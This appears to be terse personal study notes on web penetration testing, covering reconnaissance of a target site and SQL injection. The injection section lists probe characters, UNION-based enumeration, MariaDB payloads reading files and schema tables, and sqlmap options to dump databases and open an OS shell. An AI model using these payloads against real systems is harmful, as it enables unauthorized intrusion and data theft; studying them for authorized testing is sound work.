=====================
information gathering
=====================
target
	programming language and frameworks
	web server software
	database software
	server operating system

===============
inspecting urls
===============
get information from file extention
.php : php
.jsp, .do, .html : java
* nowadays, route concepts are commonly used. so this method has limit

=======================
inspecting page content
=======================
get information from source of the web page
right click and click "inspect element" then it inspect the element in the source
*firefox has "pretty print source" function. use it by clicking "{ }" button in debugger tab

========================
viewing response headers
========================
developer tool's network tab
	server header will often review the name of the server software and sometimes the version number
	header that starts with "X-" has additional information that application uses

===================
inspecting sitemaps
===================
robots.txt
sitemaps.xml

================================
locating administration consoles
================================
tomcat
phpmyadmin
default credentials : /usr/share/seclists/Passwords/Default-Credentials

=============
SQL injection
=============
basic enumeration
	' or "
	read systax error

column number enumeration
	ORDER BY <number>
	if error, number-1 is max column number

understanding the layout of the output
	UNION ALL SELECT <same number of column data>

extracting data from the database
	tasty payloads for MariaDB
		@@version
		user()
		table_name FROM information_schema.tables
		column_name FROM information_schema.columns WHERE table_name='<interesting table>'
		LOAD_FILE()
		INTO OUTFILE '<filename>'

automating SQL injection
	sqlmap -u <target url> -p "<parameter>"
		-u <target url>
		-p <parameter> specify the parameter
		--dbms=<db software>   ex.mysql
		--dump : dump the contents of all tables in the databases
		--os-shell : execute a shell
